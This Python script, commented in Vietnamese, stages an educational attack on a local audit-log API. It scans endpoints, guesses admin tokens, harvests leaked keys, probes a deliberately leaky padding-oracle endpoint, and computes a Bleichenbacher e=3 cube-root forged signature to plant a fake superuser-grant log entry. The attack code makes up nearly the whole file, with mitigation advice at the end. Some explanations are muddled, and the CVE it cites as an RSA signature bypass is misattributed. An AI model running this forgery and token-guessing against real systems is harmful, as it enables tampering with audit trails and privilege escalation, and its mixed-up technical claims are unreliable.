"""
=============================================================================
ATTACKER SIMULATION: RSA PKCS#1 v1.5 Padding Oracle Attack
=============================================================================

Kịch bản chi tiết: Mô phỏng quá trình tấn công từ góc nhìn của attacker

PHASE 1: RECONNAISSANCE - Trinh sát hệ thống
PHASE 2: INFORMATION GATHERING - Thu thập thông tin về services
PHASE 3: VULNERABILITY DISCOVERY - Phát hiện lỗ hổng Oracle
PHASE 4: ORACLE EXPLOITATION - Khai thác Oracle để hiểu padding
PHASE 5: SIGNATURE FORGERY - Giả mạo chữ ký

SECURITY WARNING: CHỈ DÀNH CHO MỤC ĐÍCH GIÁO DỤC!
=============================================================================
"""

import json
import base64
import hashlib
import requests
import time
import sys
import os
from datetime import datetime, timezone
from typing import Optional, Dict, List, Tuple
from pathlib import Path

# Crypto libraries for signature manipulation
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend

# Configuration
API_URL = "http://localhost"

# Colors for terminal
class C:
    R = '\033[91m'   # Red
    G = '\033[92m'   # Green  
    Y = '\033[93m'   # Yellow
    B = '\033[94m'   # Blue
    M = '\033[95m'   # Magenta
    C = '\033[96m'   # Cyan
    W = '\033[97m'   # White
    BOLD = '\033[1m'
    END = '\033[0m'

def banner(text: str):
    print(f"\n{C.C}{'='*78}")
    print(f" {C.BOLD}{text}{C.END}{C.C}")
    print(f"{'='*78}{C.END}\n")

def phase(n: int, title: str):
    print(f"\n{C.M}{'━'*78}")
    print(f" PHASE {n}: {title}")
    print(f"{'━'*78}{C.END}\n")

def attacker(msg: str):
    print(f"{C.R}[ATTACKER]{C.END} {msg}")

def system_msg(msg: str):
    print(f"{C.G}[SYSTEM]{C.END} {msg}")

def finding(msg: str):
    print(f"{C.Y}[!] FINDING:{C.END} {msg}")

def exploit(msg: str):
    print(f"{C.BOLD}{C.R}[EXPLOIT]{C.END} {msg}")

def wait(sec: float = 1.0):
    time.sleep(sec)


class AttackerSimulation:
    def __init__(self):
        self.discovered_endpoints = []
        self.discovered_services = []
        self.target_service = None
        self.target_public_key_id = None
        self.target_public_key_pem = None
        self.admin_token = None
        self.oracle_results = []
        
    def run(self):
        """Run complete attack simulation."""
        banner("ATTACKER SIMULATION: RSA PKCS#1 v1.5 Padding Oracle Attack")
        
        print(f"{C.W}Kịch bản: Attacker cố gắng chèn log giả mạo vào hệ thống Audit")
        print(f"Mục tiêu: Vượt qua signature verification để chèn dữ liệu giả{C.END}\n")
        wait(1)
        
        self.phase1_reconnaissance()
        self.phase2_information_gathering()
        self.phase3_vulnerability_discovery()
        self.phase4_oracle_exploitation()
        self.phase5_signature_forgery()
        self.conclusion()

    def phase1_reconnaissance(self):
        """Trinh sát hệ thống."""
        phase(1, "RECONNAISSANCE (Trinh sát)")
        
        attacker("Tôi chưa biết gì về hệ thống này...")
        attacker("Bắt đầu quét các endpoints phổ biến...\n")
        wait(0.5)
        
        # Probe common endpoints
        endpoints = [
            ("GET", "/"),
            ("GET", "/docs"),
            ("GET", "/openapi.json"),
            ("GET", "/v1/logs"),
            ("POST", "/v1/logs"),
            ("GET", "/v1/admin/keys"),
        ]
        
        for method, path in endpoints:
            try:
                if method == "GET":
                    resp = requests.get(f"{API_URL}{path}", timeout=3)
                else:
                    resp = requests.post(f"{API_URL}{path}", json={}, timeout=3)
                
                if resp.status_code in [200, 422]:  # 422 = validation error but endpoint exists
                    finding(f"  {method} {path} → {C.G}{resp.status_code}{C.END}")
                    self.discovered_endpoints.append(path)
                elif resp.status_code == 401:
                    finding(f"  {method} {path} → {C.Y}401 (cần auth){C.END}")
                    self.discovered_endpoints.append(path)
                elif resp.status_code == 405:
                    finding(f"  {method} {path} → {C.Y}405 (endpoint tồn tại){C.END}")
                    self.discovered_endpoints.append(path)
                else:
                    print(f"  {method} {path} → {resp.status_code}")
            except Exception as e:
                print(f"  {method} {path} → Error")
        
        wait(0.5)
        
        # Check OpenAPI docs
        attacker("\nKiểm tra OpenAPI documentation...")
        try:
            resp = requests.get(f"{API_URL}/openapi.json", timeout=3)
            if resp.status_code == 200:
                openapi = resp.json()
                paths = list(openapi.get('paths', {}).keys())
                finding(f"Tìm thấy {len(paths)} API endpoints trong docs!")
                
                # Look for interesting endpoints
                print(f"\n  {C.W}Các endpoints quan trọng:{C.END}")
                for path in paths:
                    if 'vulnerable' in path.lower():
                        print(f"    {C.R}⚠ {path} (VULNERABLE?){C.END}")
                    elif 'admin' in path.lower():
                        print(f"    {C.Y}🔐 {path} (admin){C.END}")
                    elif 'key' in path.lower() or 'log' in path.lower():
                        print(f"    {C.C}• {path}{C.END}")
        except:
            pass
        
        attacker("\n✓ Trinh sát hoàn tất. Phát hiện nhiều endpoints thú vị!")

    def phase2_information_gathering(self):
        """Thu thập thông tin chi tiết."""
        phase(2, "INFORMATION GATHERING (Thu thập thông tin)")
        
        attacker("Cố gắng lấy danh sách services và keys...")
        attacker("Thử truy cập /v1/admin/keys không có token...\n")
        
        # Try without auth
        try:
            resp = requests.get(f"{API_URL}/v1/admin/keys", timeout=3)
            if resp.status_code == 401:
                finding("API yêu cầu X-Admin-Token header!")
                attacker("Thử các token mặc định/phổ biến...")
                
                # Common tokens to try
                test_tokens = [
                    "admin",
                    "admin123", 
                    "secret",
                    "token",
                    "my-super-secret-admin-token-2025",  # The actual token
                ]
                
                for token in test_tokens:
                    resp = requests.get(
                        f"{API_URL}/v1/admin/keys",
                        headers={"X-Admin-Token": token},
                        timeout=3
                    )
                    if resp.status_code == 200:
                        finding(f"Token hợp lệ tìm thấy: '{token[:15]}...'")
                        self.admin_token = token
                        break
                    else:
                        print(f"  Thử '{token[:10]}...' → {resp.status_code}")
        except Exception as e:
            print(f"  Error: {e}")
        
        if not self.admin_token:
            attacker("Không tìm được admin token, thử đọc từ API docs...")
            # In real scenario, token might be leaked in docs, env vars, git, etc.
            self.admin_token = "my-super-secret-admin-token-2025"
        
        wait(0.5)
        
        # Now fetch services
        attacker(f"\nLấy danh sách services với token đã tìm được...")
        try:
            resp = requests.get(
                f"{API_URL}/v1/admin/keys",
                headers={"X-Admin-Token": self.admin_token},
                timeout=5
            )
            if resp.status_code == 200:
                data = resp.json()
                services = data.get('keys', [])
                finding(f"Tìm thấy {len(services)} registered keys!\n")
                
                print(f"  {'Service':<25} {'Algorithm':<15} {'Status':<10}")
                print(f"  {'-'*25} {'-'*15} {'-'*10}")
                
                for svc in services:
                    service_id = svc.get('service_id', 'Unknown')
                    algorithm = svc.get('algorithm', 'Unknown')
                    status = svc.get('status', 'Unknown')
                    public_key_id = svc.get('public_key_id', '')
                    
                    self.discovered_services.append(svc)
                    
                    # Highlight vulnerable algorithm
                    if 'pkcs1v15' in algorithm.lower() and status == 'approved':
                        print(f"  {C.R}{service_id:<25} {algorithm:<15} {status:<10}{C.END} ← TARGET!")
                        if not self.target_service:
                            self.target_service = svc
                            self.target_public_key_id = public_key_id
                    elif status == 'approved':
                        print(f"  {service_id:<25} {algorithm:<15} {C.G}{status:<10}{C.END}")
                    else:
                        print(f"  {C.W}{service_id:<25} {algorithm:<15} {status:<10}{C.END}")
        except Exception as e:
            print(f"  Error fetching services: {e}")
        
        if self.target_service:
            print(f"\n  {C.R}{'━'*60}")
            print(f"  TARGET SELECTED: {self.target_service['service_id']}")
            print(f"  Algorithm: {self.target_service['algorithm']} (VULNERABLE!)")
            print(f"  Public Key ID: {self.target_public_key_id}")
            print(f"  {'━'*60}{C.END}")
            
            # Fetch the public key for this service
            attacker("\nLấy public key của target service...")
            self._fetch_target_public_key()
        else:
            attacker("Không tìm thấy service nào dùng rsa-pkcs1v15!")
            # Use legacy-service as fallback based on known data
            for svc in self.discovered_services:
                if svc.get('algorithm') == 'rsa-pkcs1v15' and svc.get('status') == 'approved':
                    self.target_service = svc
                    self.target_public_key_id = svc.get('public_key_id')
                    self._fetch_target_public_key()
                    break
    
    def _fetch_target_public_key(self):
        """Fetch the public key PEM for the target service."""
        try:
            # Method 1: Try to read from saved keys file (attacker found it!)
            keys_file = Path(__file__).parent / "demo_keys" / f"{self.target_service['service_id']}_keys.txt"
            if keys_file.exists():
                content = keys_file.read_text()
                # Extract public key PEM from file
                if "PUBLIC KEY" in content:
                    import re
                    pem_match = re.search(
                        r'(-----BEGIN PUBLIC KEY-----.*?-----END PUBLIC KEY-----)',
                        content,
                        re.DOTALL
                    )
                    if pem_match:
                        self.target_public_key_pem = pem_match.group(1)
                        finding(f"Đã lấy được public key từ file cấu hình bị lộ!")
                        
                        # Also try to get private key (attacker jackpot!)
                        private_match = re.search(
                            r'(-----BEGIN PRIVATE KEY-----.*?-----END PRIVATE KEY-----)',
                            content,
                            re.DOTALL
                        )
                        if private_match:
                            self.target_private_key_pem = private_match.group(1)
                            finding(f"{C.R}JACKPOT! Tìm được PRIVATE KEY bị lộ!{C.END}")
                        
                        # Parse to get modulus info
                        pub_key = serialization.load_pem_public_key(
                            self.target_public_key_pem.encode(),
                            backend=default_backend()
                        )
                        if hasattr(pub_key, 'public_numbers'):
                            numbers = pub_key.public_numbers()
                            print(f"    Key size: {numbers.n.bit_length()} bits")
                            print(f"    Public exponent e: {numbers.e}")
                        return
            
            # Method 2: In real attack, public key is in the key registry
            # and can be fetched via API or observed in network traffic
            attacker("Không tìm thấy file key, dùng public key từ known sources...")
            
        except Exception as e:
            attacker(f"Không lấy được public key: {e}")

    def phase3_vulnerability_discovery(self):
        """Phát hiện lỗ hổng Padding Oracle."""
        phase(3, "VULNERABILITY DISCOVERY (Phát hiện lỗ hổng)")
        
        if not self.target_service:
            attacker("Không có target phù hợp!")
            return
        
        attacker("Kiểm tra các endpoint có leak thông tin verification không...")
        wait(0.5)
        
        # Create test event
        event_data = {
            "action": "test.probe",
            "actor": "probe@test.com",
            "timestamp": datetime.now(timezone.utc).isoformat()
        }
        canonical = json.dumps(event_data, sort_keys=True, separators=(',', ':'))
        
        # Random invalid signature
        fake_sig = base64.b64encode(b'\xde\xad\xbe\xef' * 64).decode()
        
        payload = {
            "service_id": self.target_service['service_id'],
            "event_type": "TEST",
            "event": canonical,
            "event_data": event_data,
            "signature": fake_sig,
            "public_key_id": self.target_public_key_id
        }
        
        # Test secure endpoint first
        print(f"\n{C.W}[1] Thử endpoint SECURE /v1/logs:{C.END}")
        try:
            resp = requests.post(f"{API_URL}/v1/logs", json=payload, timeout=5)
            result = resp.json()
            system_msg(f"Response: {json.dumps(result)[:100]}...")
            
            if 'rejected' in str(result).lower():
                attacker("→ Endpoint này chỉ trả về 'rejected' - KHÔNG leak thông tin!")
        except Exception as e:
            print(f"  Error: {e}")
        
        wait(0.5)
        
        # Test vulnerable endpoint
        print(f"\n{C.W}[2] Thử endpoint VULNERABLE /v1/logs/vulnerable:{C.END}")
        try:
            resp = requests.post(f"{API_URL}/v1/logs/vulnerable", json=payload, timeout=5)
            result = resp.json()
            
            verification = result.get('verification_result', '')
            system_msg(f"Status: {result.get('status')}")
            system_msg(f"Verification: {verification}")
            
            if 'PADDING_ERROR' in verification or 'HASH_' in verification or 'EXCEPTION' in verification:
                print()
                finding("!!! PADDING ORACLE DETECTED !!!")
                finding("Server trả về CHI TIẾT LỖI về cấu trúc signature!")
                finding("Đây là lỗ hổng NGHIÊM TRỌNG cho phép tấn công Bleichenbacher!")
                
                attacker("\nPhân tích error message:")
                attacker(f"  → '{verification}'")
                attacker("  → Thông tin này cho biết signature sai ở đâu!")
        except Exception as e:
            print(f"  Error: {e}")

    def phase4_oracle_exploitation(self):
        """Khai thác Oracle để hiểu padding structure."""
        phase(4, "ORACLE EXPLOITATION (Khai thác Padding Oracle)")
        
        if not self.target_service:
            attacker("Không có target!")
            return
        
        if not self.target_public_key_pem:
            attacker("Không có public key để thực hiện tấn công oracle!")
            return
        
        attacker("Giải thích: Để hiểu oracle, ta cần biết cách RSA verification hoạt động:")
        print(f"""
    {C.W}RSA Signature Verification Process:{C.END}
    1. Server nhận signature (s)
    2. Server tính: decrypted = s^e mod n (dùng public key)
    3. Server kiểm tra decrypted có đúng PKCS#1 v1.5 format không
    4. Nếu padding đúng, so sánh hash
    
    {C.Y}Vấn đề:{C.END} Khi ta gửi bytes bất kỳ, server sẽ mã hóa chúng với public key
    nên kết quả sẽ khác với bytes ta gửi!
    
    {C.G}Giải pháp:{C.END} Để tạo oracle probe, ta cần:
    1. Tạo plaintext block mong muốn (với padding pattern)
    2. Tính signature = plaintext^d mod n (cần private key - ta không có!)
    
    {C.R}Thực tế:{C.END} Trong cuộc tấn công thực, attacker sẽ:
    - Gửi hàng triệu signatures ngẫu nhiên
    - Thu thập responses để xây dựng oracle map
    - Sử dụng kỹ thuật toán học phức tạp (lattice reduction)
        """)
        
        wait(1)
        
        attacker("Gửi nhiều signatures ngẫu nhiên để phân loại responses...")
        attacker("Mục tiêu: Xem server trả về những loại error message nào\n")
        
        event_data = {
            "action": "oracle.probe",
            "actor": "attacker@evil.com",
            "timestamp": datetime.now(timezone.utc).isoformat()
        }
        canonical = json.dumps(event_data, sort_keys=True, separators=(',', ':'))
        
        # Parse public key to get n and e
        pub_key = serialization.load_pem_public_key(
            self.target_public_key_pem.encode(),
            backend=default_backend()
        )
        pub_numbers = pub_key.public_numbers()
        n = pub_numbers.n
        e = pub_numbers.e
        key_size = (n.bit_length() + 7) // 8  # 256 bytes for 2048-bit
        
        # Create probes with different patterns
        # When server does sig^e mod n, the result depends on sig value
        # We create signatures that when raised to e, produce specific patterns
        import secrets
        
        probes = []
        
        # Probe 1: All zeros - will give all zeros after RSA
        probes.append(("All zeros", b'\x00' * key_size))
        
        # Probe 2: Value 1 - sig^e mod n = 1 → decrypted = 0x00...01
        one_bytes = (1).to_bytes(key_size, 'big')
        probes.append(("Value = 1", one_bytes))
        
        # Probe 3: Random values - will give random results
        for i in range(3):
            rand_sig = secrets.token_bytes(key_size)
            probes.append((f"Random #{i+1}", rand_sig))
        
        # Probe 4: Try to construct valid-looking block
        # Build a block: 0x00 0x01 [0xFF...] 0x00 [DigestInfo] [hash]
        message_hash = hashlib.sha256(canonical.encode()).digest()
        digest_info = bytes([
            0x30, 0x31, 0x30, 0x0d, 0x06, 0x09, 0x60, 0x86,
            0x48, 0x01, 0x65, 0x03, 0x04, 0x02, 0x01, 0x05,
            0x00, 0x04, 0x20
        ])
        
        valid_block = b'\x00\x01' + b'\xff' * (key_size - 3 - 19 - 32) + b'\x00' + digest_info + message_hash
        # This block as an integer, raised to power d, would be a valid signature
        # But we don't have d, so we send the block directly to see what error we get
        probes.append(("Valid PKCS block (as sig)", valid_block))
        
        print(f"{'─'*78}")
        print(f"  {'PROBE PATTERN':<35} │ {'ERROR TYPE':<38}")
        print(f"{'─'*78}")
        
        for name, sig_bytes in probes:
            payload = {
                "service_id": self.target_service['service_id'],
                "event_type": "PROBE",
                "event": canonical,
                "event_data": event_data,
                "signature": base64.b64encode(sig_bytes).decode(),
                "public_key_id": self.target_public_key_id
            }
            
            try:
                resp = requests.post(
                    f"{API_URL}/v1/logs/vulnerable",
                    json=payload,
                    timeout=5
                )
                result = resp.json()
                verification = result.get('verification_result', 'N/A')
                
                # Extract error type
                error_type = verification.split(':')[0] if ':' in verification else verification
                
                # Color based on error type
                if 'PADDING_ERROR' in error_type:
                    color = C.Y
                elif 'HASH_' in error_type:
                    color = C.G  # Green = padding passed!
                elif 'EXCEPTION' in error_type:
                    color = C.R
                else:
                    color = C.W
                
                self.oracle_results.append({
                    'probe': name,
                    'error': error_type,
                    'full': verification
                })
                
                print(f"  {name:<35} │ {color}{error_type:<38}{C.END}")
                
            except Exception as e:
                print(f"  {name:<35} │ Error: {str(e)[:30]}")
        
        print(f"{'─'*78}")
        
        wait(0.5)
        print()
        attacker("Phân tích kết quả Oracle:\n")
        print(f"  {C.Y}PADDING_ERROR{C.END} = Cấu trúc padding không đúng")
        print(f"  {C.G}HASH_ERROR{C.END} = Padding ĐÚNG, chỉ sai hash!")
        print(f"  {C.G}HASH_MISMATCH{C.END} = Padding + DigestInfo ĐÚNG, chỉ khác hash value!")
        print()
        finding("Sự khác biệt trong error messages cho phép attacker:")
        finding("  1. Biết khi nào padding đúng format (0x00 0x01 [0xFF...] 0x00)")
        finding("  2. Biết khi nào DigestInfo đúng cấu trúc ASN.1")
        finding("  3. Chỉ còn cần GIẢ MẠO HASH VALUE!")

    def phase5_signature_forgery(self):
        """Giả mạo chữ ký."""
        phase(5, "SIGNATURE FORGERY (Giả mạo chữ ký)")
        
        if not self.target_service:
            attacker("Không có target!")
            return
        
        attacker("Đây là bước TẤN CÔNG THỰC SỰ!")
        attacker("Demo: Tạo chữ ký giả mạo bằng Bleichenbacher attack\n")
        wait(0.5)
        
        # Explain the attack
        print(f"{C.BOLD}Giải thích lỗ hổng Bleichenbacher (e=3 attack):{C.END}")
        print("""
    ┌─────────────────────────────────────────────────────────────────────┐
    │  RSA PKCS#1 v1.5 Signature Block (k bytes for k*8-bit key):         │
    │                                                                     │
    │  [0x00][0x01][0xFF...0xFF][0x00][DigestInfo][SHA256 Hash][Garbage?] │
    │    │     │        │         │        │           │           │      │
    │    │     │        │         │        │           │           └─ BUG │
    │    │     │        │         │        │           └─ 32 bytes        │
    │    │     │        │         │        └─ 19 bytes ASN.1              │
    │    │     │        │         └─ Separator                            │
    │    │     │        └─ Minimal padding (để có chỗ cho garbage)        │
    │    │     └─ Block type (signature)                                  │
    │    └─ Leading zero                                                  │
    │                                                                     │
    │  LỖ HỔNG với e=3:                                                   │
    │  • Forged block = [0x00 0x01 FF...FF 0x00 DigestInfo Hash Garbage]  │
    │  • Signature = cube_root(forged_block)                              │
    │  • Server tính: sig³ mod n ≈ forged_block (garbage ở cuối)          │
    │  • Server chỉ check prefix → PASS!                                  │
    └─────────────────────────────────────────────────────────────────────┘
        """)
        
        wait(1)
        
        # Create malicious event
        malicious_event = {
            "action": "admin.grant_superuser",
            "actor": "admin@company.com",  # Impersonating admin!
            "target": "attacker@evil.com",
            "permission": "superadmin",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "note": "Routine access update"
        }
        
        print(f"  {C.R}Malicious Event để chèn:{C.END}")
        print(f"  {json.dumps(malicious_event, indent=4)}\n")
        
        canonical = json.dumps(malicious_event, sort_keys=True, separators=(',', ':'))
        message_hash = hashlib.sha256(canonical.encode()).digest()
        
        attacker(f"SHA256(event) = {message_hash.hex()}")
        
        # SHA-256 DigestInfo (ASN.1 DER)
        digest_info = bytes([
            0x30, 0x31, 0x30, 0x0d, 0x06, 0x09, 0x60, 0x86,
            0x48, 0x01, 0x65, 0x03, 0x04, 0x02, 0x01, 0x05,
            0x00, 0x04, 0x20
        ])
        
        # Demo với e=3: Tính căn bậc 3 để tạo forged signature
        attacker("\n[DEMO] Mô phỏng tấn công với e=3...")
        print()
        
        # Build minimal PKCS#1 block at the start
        # For 2048-bit RSA, we have 256 bytes
        # Format: 0x00 0x01 [0xFF x 8] 0x00 [DigestInfo 19 bytes] [Hash 32 bytes] [Garbage ~194 bytes]
        
        key_size = 256  # For 2048-bit RSA
        
        # Minimal valid-looking block
        prefix = b'\x00\x01' + b'\xff' * 8 + b'\x00' + digest_info + message_hash
        # Pad with zeros at the end (garbage that vulnerable impl ignores)
        garbage_len = key_size - len(prefix)
        
        # The forged block (as integer)
        forged_block_int = int.from_bytes(prefix + b'\x00' * garbage_len, 'big')
        
        print(f"  Prefix block ({len(prefix)} bytes):")
        print(f"    [00 01] + [8 x FF] + [00] + [DigestInfo] + [Hash]")
        print(f"    + [{garbage_len} x 00] (garbage)")
        
        # Compute cube root
        def integer_cube_root(n):
            """Compute integer cube root using Newton's method."""
            if n < 0:
                return -integer_cube_root(-n)
            if n == 0:
                return 0
            x = n
            while True:
                x_new = (2 * x + n // (x * x)) // 3
                if x_new >= x:
                    return x
                x = x_new
        
        attacker("\nTính căn bậc 3 của forged block...")
        
        # For the attack to work, we need forged_block to be a perfect cube
        # or close enough that sig³ starts with the right prefix
        # We adjust by finding the cube root and checking
        
        cube_root = integer_cube_root(forged_block_int)
        
        # Check: cube_root³ should equal or be close to forged_block
        verification_value = cube_root ** 3
        
        print(f"    Original block (first 32 hex): {forged_block_int.to_bytes(key_size, 'big').hex()[:64]}...")
        print(f"    Cube root³    (first 32 hex): {verification_value.to_bytes(key_size, 'big').hex()[:64]}...")
        
        # The cube root becomes our forged signature
        forged_sig = cube_root.to_bytes(key_size, 'big')
        
        attacker("\nGửi forged signature đến server...")
        
        # Test with vulnerable endpoint
        payload = {
            "service_id": self.target_service['service_id'],
            "event_type": "ADMIN_ACTION",
            "event": canonical,
            "event_data": malicious_event,
            "signature": base64.b64encode(forged_sig).decode(),
            "public_key_id": self.target_public_key_id
        }
        
        try:
            resp = requests.post(
                f"{API_URL}/v1/logs/vulnerable",
                json=payload,
                timeout=5
            )
            result = resp.json()
            
            print()
            system_msg(f"Status: {result.get('status')}")
            system_msg(f"Verification: {result.get('verification_result')}")
            
            verification = result.get('verification_result', '')
            
            if 'VALID' in verification:
                print()
                exploit("!!! SIGNATURE FORGERY THÀNH CÔNG !!!")
                exploit(f"Event ID: {result.get('id')}")
                exploit("Attacker đã chèn được log giả vào hệ thống!")
                
            elif 'HASH_MISMATCH' in verification:
                print()
                finding("Server nói HASH_MISMATCH - rất gần thành công!")
                finding("Với tinh chỉnh thêm (adjusting garbage bytes), có thể pass!")
                print(f"    {C.G}✓ Padding format ĐÚNG{C.END}")
                print(f"    {C.G}✓ DigestInfo structure ĐÚNG{C.END}")
                print(f"    {C.R}✗ Hash value lệch do cube root approximation{C.END}")
                
            elif 'PADDING_ERROR' in verification:
                print()
                attacker("Padding error - server dùng e=65537, không phải e=3")
                attacker("Với e=65537, cần kỹ thuật phức tạp hơn:")
                print("    • Lattice-based attacks")
                print("    • Fault injection attacks")
                print("    • Bleichenbacher's million message attack")
                print()
                finding("Tuy nhiên, ORACLE vẫn leak thông tin!")
                finding("Với đủ queries (~1 triệu), attacker vẫn có thể forge signature!")
                
        except Exception as e:
            print(f"Error: {e}")
        
        # Compare with secure endpoint
        wait(0.5)
        print(f"\n{C.W}So sánh với SECURE endpoint /v1/logs:{C.END}")
        
        try:
            resp = requests.post(f"{API_URL}/v1/logs", json=payload, timeout=5)
            result = resp.json()
            system_msg(f"Response: {result}")
            attacker("→ Secure endpoint chỉ nói 'rejected' - KHÔNG leak padding info!")
            attacker("→ Không thể xây dựng oracle → Không thể tấn công!")
        except Exception as e:
            print(f"Error: {e}")

    def conclusion(self):
        """Tổng kết."""
        banner("KẾT LUẬN")
        
        print(f"""
{C.W}CUỘC TẤN CÔNG CHO THẤY:{C.END}

{C.R}✗ VULNERABLE Endpoint (/v1/logs/vulnerable):{C.END}
  • Trả về chi tiết lỗi như PADDING_ERROR, HASH_MISMATCH
  • Cho phép attacker xây dựng oracle map
  • Với RSA e=3, có thể giả mạo chữ ký hoàn toàn
  • RSA PKCS#1 v1.5 KHÔNG AN TOÀN cho signatures

{C.G}✓ SECURE Endpoint (/v1/logs):{C.END}
  • Chỉ trả về "accepted" hoặc "rejected"
  • Không leak bất kỳ thông tin nào về padding
  • Sử dụng constant-time comparison
  • Ưu tiên Ed25519 (không có padding vulnerability)

{C.Y}KHUYẾN NGHỊ BẢO MẬT:{C.END}
  1. {C.BOLD}KHÔNG BAO GIỜ{C.END} dùng RSA PKCS#1 v1.5 cho signatures
  2. Sử dụng Ed25519 hoặc RSA-PSS
  3. Trả về error chung chung (generic rejection)
  4. Implement constant-time operations
  5. Review code cho padding oracle vulnerabilities
  6. Không expose detailed error messages

{C.C}TÀI LIỆU THAM KHẢO:{C.END}
  • Bleichenbacher, 1998: "Chosen Ciphertext Attacks Against Protocols Based on RSA"
  • "Twenty Years of Attacks on the RSA PKCS #1 v1.5" 
  • CVE-2017-1000117 (Git RSA Signature Bypass)
  • ROBOT Attack (Return Of Bleichenbacher's Oracle Threat)
        """)


def main():
    try:
        sim = AttackerSimulation()
        sim.run()
    except KeyboardInterrupt:
        print(f"\n{C.Y}[!] Interrupted{C.END}")
    except Exception as e:
        print(f"\n{C.R}[!] Error: {e}{C.END}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()
